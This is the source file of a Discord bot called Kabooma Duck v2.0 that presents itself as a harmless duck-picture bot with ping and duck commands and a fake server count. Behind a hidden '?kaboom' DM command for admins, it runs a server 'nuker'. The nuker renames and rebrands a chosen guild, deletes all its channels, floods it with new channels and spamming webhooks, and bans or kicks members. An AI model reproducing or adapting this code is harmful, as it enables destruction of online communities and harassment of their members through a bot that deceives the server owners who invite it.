// Kabooma Duck v2.0 / index.js / Updated 7.25.2023
// Bot Dependencies
const { Client, Events, GatewayIntentBits, EmbedBuilder, Partials, ActionRowBuilder, StringSelectMenuBuilder, ActivityType } = require('discord.js')
let { token, admins, botName, fakeServers, advancedOptions } = require('./config.json') // Kabooma Duck Config v2.0 / config.json / Updated 7.25.2023 / Check README for info
const axios = require('axios').default 
// CMD Dependencies
const chalk = require('chalk')
const figlet = require('figlet')

if (!advancedOptions.enabled) {
    advancedOptions = require('./otherConfig/defaultAdvanced.json').advancedOptions
}

const client = new Client({ intents: [   
        GatewayIntentBits.DirectMessages, 
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.MessageContent, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.GuildWebhooks
    ], partials: [
        Partials.Channel
    ] })

function registercmds() {
    const { SlashCommandBuilder } = require('@discordjs/builders')
    const { REST } = require('@discordjs/rest')
    const { Routes } = require('discord-api-types/v9')
    const { clientID, token } = require('./config.json')

    const commands = [
    	new SlashCommandBuilder().setName('ping').setDescription('Replies with pong!'),
    	new SlashCommandBuilder().setName('duck').setDescription('Generates a random duck!'),
    ]
	.map(command => command.toJSON())

    const rest = new REST({ version: '9' }).setToken(token)

    rest.put(Routes.applicationCommands(clientID), { body: commands })
    	.then(() => console.log('Successfully registered application commands.'))
    	.catch(console.error())
}

client.once(Events.ClientReady, c => {
    console.clear()
	console.log(chalk.yellowBright(figlet.textSync('Kabooma Duck', { font: '4Max' })))
    console.log(chalk.redBright(`Version 2.0 | Logged in as ${client.user.tag} / ${client.user.id}`))
    console.log(chalk.redBright('Press Ctrl+C to exit. | Admins may use ?kaboom in bot DMs'))
    registercmds()
    client.user.setActivity(`${fakeServers} servers!`, { type: ActivityType.Watching })
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return

    const { commandName } = interaction

    if (commandName === 'ping') {
        var embed = new EmbedBuilder()
        .setTitle("Pong!")
        .setDescription(`Bot latency: ${Math.abs(interaction.createdTimestamp - Date.now())}ms\nAPI latency: ${Math.round(client.ws.ping)}ms`)
        .setColor("#fceb02")

		await interaction.reply({ embeds: [embed] })
    } else if (commandName === 'duck') {
        var responses = ['Quack!', 'What is storytime called when you read to ducklings? Ducktales. 🤣', `What's a duck's favorite ballet? The Nutquacker! 🤣`, 'I have served you, master.', `Here's another goddamn duck I guess.`, 'FINE! I will give you another duck.', 'As you wish.', 'Okie dokie!', 'Quack Quack', 'QUACK QUACK QUACK']

        await interaction.reply('Thinking...')

        axios.get('https://random-d.uk/api/v2/random')
        .then(async response => {
            var random = Math.floor(Math.random() * (responses.length + 1))

            var embed = new EmbedBuilder()
            .setTitle(`${botName} - Duck`)
            .setDescription(responses[random])
            .setImage(response.data.url)
            .setColor('#fceb02')

            await interaction.editReply({embeds: [embed], content: ' '})
        })
    }
})

// NUKER BELOW
client.on('messageCreate', async message => {
    if (message.channel.type == 1) {
        if (message.content != '?kaboom') return
        if (!admins.includes(message.author.id)) return

        console.log(chalk.blueBright(`[INFO] ${message.author.tag} opened the nuke panel.`))

        var guildNames = client.guilds.cache.map(guild => guild.name)
        var guildIDs = client.guilds.cache.map(guild => guild.id )
        var opts = []

        for (let i = 0; i < guildNames.length; i++) {
            opts.push({
                label: guildNames[i],
                value: guildIDs[i],
                description: `Guild ID: ${guildIDs[i]}`
            })
        }

        var embed = new EmbedBuilder()
        .setTitle('KABOOMA DUCK NUKE PANEL')
        .setAuthor({name: 'Kabooma Duck v2.0 by RatWithAFace'})
        .setColor('#fc00bd')
        .setDescription('Welcome to the Kabooma Duck Nuke Panel. Please select a guild to nuke.')

        var component = new ActionRowBuilder()
        .addComponents(
            new StringSelectMenuBuilder()
            .setCustomId('guild')
            .setPlaceholder('Select a guild.')
            .addOptions(opts)
        )

        await message.reply({embeds: [embed], components: [component]})
    }
})

client.on('interactionCreate', async interaction => {
    if (!interaction.isStringSelectMenu()) return

    await interaction.reply('KABOOMING!')
    console.log(chalk.blueBright(`[INFO] A nuke was initiated on guild ID ${interaction.values[0]}.`))

    var guild = client.guilds.cache.get(interaction.values[0])

    guild.setName(advancedOptions.server.nameChange)
    guild.setIcon(advancedOptions.server.iconChange)
    if (guild.banner != null) {
        guild.setBanner(advancedOptions.server.bannerChange)
    }

    var gChannels = guild.channels.cache.map(channel => channel.id)

    async function webhookSpam(webhook) { 
        var wInterval = setInterval(() => {
            try {
                webhook.send(advancedOptions.webhook.message)
            } catch (error) {
                throw error
            }
        }, 500);
        setTimeout(() => {
            clearInterval(wInterval)
        }, 300000)
    }
    
    for (let i = 0; i < gChannels.length; i++) {
        guild.channels.cache.get(gChannels[i]).delete()
    }

    for (let loop = 0; loop < advancedOptions.channels.amount; loop++) {
        try {
            guild.channels.create({name: `${advancedOptions.channels.channelNames}-${loop}`}).then(async channel => {
                setTimeout(() => {
                    channel.createWebhook({name: advancedOptions.webhook.name, avatar: advancedOptions.webhook.avatar}).then(webhook => { webhookSpam(webhook) })
                }, 300)
            })
        } catch (error) {
            loop--
            throw error
        }
    }
    
    

    if (advancedOptions.banning.enabled) {
        var gMembers = guild.members.cache.map(member => member.id)

        for (let i = 0; i < gMembers.length; i++) {
            var member = guild.members.cache.get(gMembers[i])
            if (member.bannable) {
                member.ban({reason: advancedOptions.banning.banReason})
            } else if (member.kickable) {
                member.kick(advancedOptions.banning.banReason)
            }
        }
    }
    
})

client.login(token)